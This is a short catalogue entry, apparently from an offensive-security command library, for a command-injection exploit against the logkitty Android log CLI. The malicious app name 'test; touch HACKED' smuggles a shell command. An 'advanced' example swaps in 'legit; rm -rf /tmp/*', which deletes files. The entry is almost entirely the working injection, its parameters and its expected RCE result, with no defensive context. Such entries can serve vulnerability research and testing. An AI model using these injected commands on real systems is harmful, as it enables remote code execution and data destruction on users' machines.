---
data: logkitty android app 'test; touch HACKED'
tags:
  - rce
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - Node.js
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:32.489Z'
id: a0066d04-ba65-4d8d-94e8-0f178f7fff05
verified: false
validated: true
submitted: true
---
# logkitty-android-app-injection

## Command

```bash
logkitty android app 'test; touch HACKED'
```

## Description

Executes the logkitty CLI in Android mode targeting a specific app, but uses a malicious app name to inject a shell command, exploiting the vulnerability for RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `android` | Specifies Android log mode | Yes |
| `app` | Subcommand for app-specific logs | Yes |
| `'test; touch HACKED'` | Malicious app name injecting '; touch HACKED' | Yes |

## Examples

### Basic Usage

```bash
logkitty android app 'test; touch HACKED'
```

### Advanced Usage

```bash
logkitty android app 'legit; rm -rf /tmp/*'
```

## Expected Output

Partial ADB logs or errors, but underlying injection creates 'HACKED' file, confirming RCE.

## Related

- [[Related Procedure]]
